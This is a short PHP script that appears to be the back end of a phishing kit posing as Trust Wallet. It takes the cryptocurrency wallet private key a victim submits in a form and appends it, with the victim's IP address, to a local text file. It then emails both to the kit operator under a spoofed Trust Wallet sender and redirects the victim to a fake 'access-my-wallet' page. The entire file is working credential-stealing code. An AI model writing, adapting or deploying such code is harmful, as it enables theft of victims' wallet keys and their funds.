<?php
$file = "twtgacor.txt";
$PrivateKey = $_POST['PrivateKey'];
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "PrivateKey   	: ");
fwrite($handle, "$PrivateKey");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "https://trustwallet.com ");
fwrite($handle, "\n");
fclose($handle);
$PrivateKey = $_POST['PrivateKey'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

PrivateKey : ".$PrivateKey." 

IP Address : https://geoiptool.com/?IP=".$ip." 

https://trustwallet.com/
";
include 'mail.php';
$subject = "============ RASOKI ============ ".$ip." ";
$headers = "From: trustwallet <putrasya41@gmail.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/trust.php?/access-my-wallet\";
// -->
</script>";
?>